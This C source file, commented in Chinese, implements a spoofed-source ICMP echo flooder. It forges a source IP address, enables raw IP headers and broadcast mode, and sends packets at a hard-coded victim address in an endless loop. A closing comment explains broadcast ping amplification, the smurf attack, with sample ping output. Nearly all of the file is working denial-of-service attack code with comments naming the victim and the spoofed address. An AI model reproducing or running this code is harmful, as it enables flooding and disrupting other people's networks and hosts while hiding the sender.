#include <stdio.h>
#include <sys/socket.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <stdlib.h>
#include <netinet/in.h>
#include <pthread.h>

unsigned short csum(unsigned short *packet, int packlen);
unsigned short tcpcsum(unsigned char *iphdr, unsigned short *packet, int packlen);
unsigned short in_cksum(unsigned short *addr, int len);

//校验和涵数 ip头
unsigned short csum(unsigned short *packet, int packlen) {
    register unsigned long sum = 0;
    while (packlen > 1) {
        sum += *(packet++);
        packlen -= 2;
    }
    if (packlen > 0)
        sum += *(unsigned char *) packet;
    while (sum >> 16)
        sum = (sum & 0xffff) + (sum >> 16);

    return (unsigned short) ~sum;
}

//校验和涵数 tcp头
unsigned short tcpcsum(unsigned char *iphdr, unsigned short *packet, int packlen) {
    unsigned short *buf;
    unsigned short res;
    buf = malloc(packlen + 12);
    if (buf == NULL)
        return 0;
    memcpy(buf, iphdr + 12, 8); //源IP地址和目标IP地址
    *(buf + 4) = htons((unsigned short) (*(iphdr + 9)));
    *(buf + 5) = htons((unsigned short) packlen);
    memcpy(buf + 6, packet, packlen);
    res = csum(buf, packlen + 12);
    free(buf);
    return res;
}

//校验和涵数icmp头
unsigned short in_cksum(unsigned short *addr, int len) {
    int sum = 0;
    unsigned short res = 0;
    while (len > 1) {
        sum += *addr++;
        len -= 2;
    }
    if (len == 1) {
        *((unsigned char *) (&res)) = *((unsigned char *) addr);
        sum += res;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    res = ~sum;
    return res;
}

int main(int argc, char *argv[]) {
    int sock, bytes_send;
    struct sockaddr_in sin;

    struct ip *iphead;
    struct icmp *icmphead;
    char *packet;
    int pktsize = sizeof(struct ip) + sizeof(struct icmp) + 64;

    packet = malloc(pktsize);
    iphead = (struct ip *) packet;
    icmphead = (struct icmp *) (packet + sizeof(struct ip));

    memset(packet, 0, pktsize);

    printf("create socket\r\n");
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr("192.168.0.194"); //被攻击者的ip
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if (sock > 0) {
        printf("socket ok\n");
    } else {
        printf("socket error \n");
    }

    //IP_HDRINCL 在数据包中包含IP首部 int 这个选项常用于黑客技术中，隐藏自己的IP地址
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &pktsize, sizeof(pktsize)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    const int on = 1;//设定常量，用于打开广播模式
    //设定该接口上的广播模式
    if (setsockopt(sock, SOL_SOCKET, SO_BROADCAST, &on, sizeof(on)) < 0) {
        printf("2");
        perror("IP_HDRINCL");
        exit(1);
    }

    printf("create iphead\r\n");
    iphead->ip_v = 4;
    iphead->ip_hl = 5;
    iphead->ip_tos = 0x00;
    iphead->ip_len = htons(pktsize);
    iphead->ip_id = htons(getpid());
    iphead->ip_off = 0;
    iphead->ip_ttl = 0x0;
    iphead->ip_p = IPPROTO_ICMP;
    iphead->ip_sum = 0;
    inet_aton("192.168.0.157", &iphead->ip_src);//假冒的ip
    inet_aton("192.168.0.194", &iphead->ip_dst);//被攻击者的ip

    printf("create icmphead\r\n");
    icmphead->icmp_type = ICMP_ECHO;
    icmphead->icmp_code = 0;
    icmphead->icmp_cksum = htons(~(ICMP_ECHO << 8));

    iphead->ip_sum = csum(iphead, sizeof(struct ip));
    icmphead->icmp_cksum = in_cksum(icmphead, sizeof(struct icmp));

    printf("start send\r\n");

    int j;
    int i = 1;
    while (i) {
        sendto(sock, packet, pktsize, 0, (struct sockaddr *) &sin, sizeof(sin));
//		printf("sending\r\n");
//		i--;
    }
    free(packet);
    printf("end send\r\n");
    return 0;
}
/*
 *如果我们往广播地址发送一个ICMP ECHO报文(就是Ping广播地址一下)，结果会得到非常多的回应，
 *如果我们往广播地址发送一个ICMP 以太网内每一个允许接收广播报文的主机都会回应一个ICMP_ECHOREPLY，
 *如果我们往广播地址发送一个ICMP 如果你想试验，可以在unix的机器上Ping一下你局域网的广播地址，
 *如果我们往广播地址发送一个ICMP 会看到很多回应的的dup包，就是重复的应答
 *root@test5:/home/malitest/mysocketTest# ping 192.168.0.255 -b
WARNING: pinging broadcast address
PING 192.168.0.255 (192.168.0.255) 56(84) bytes of data.
64 bytes from 192.168.0.4: icmp_seq=1 ttl=64 time=0.262 ms
64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=1.13 ms (DUP!)
64 bytes from 192.168.0.2: icmp_seq=1 ttl=64 time=1.17 ms (DUP!)
64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.183 ms
64 bytes from 192.168.0.2: icmp_seq=2 ttl=64 time=0.200 ms (DUP!)
64 bytes from 192.168.0.4: icmp_seq=2 ttl=64 time=0.242 ms (DUP!)
64 bytes from 192.168.0.2: icmp_seq=3 ttl=64 time=0.163 ms
64 bytes from 192.168.0.2: icmp_seq=3 ttl=64 time=0.178 ms (DUP!)
64 bytes from 192.168.0.4: icmp_seq=3 ttl=64 time=0.198 ms (DUP!)
 *
 * windows系统上不会有这样的结果，因为微软的Ping程序不对多个回应进行解包(所以我收不到重复的包了)，收到第一个包以后就丢弃后面的了，
 * 同样微软的系统默认也不回应广播地址的包
 *
 * windows防火墙 高级——>本地连接——>设置——>ICMP
 * */
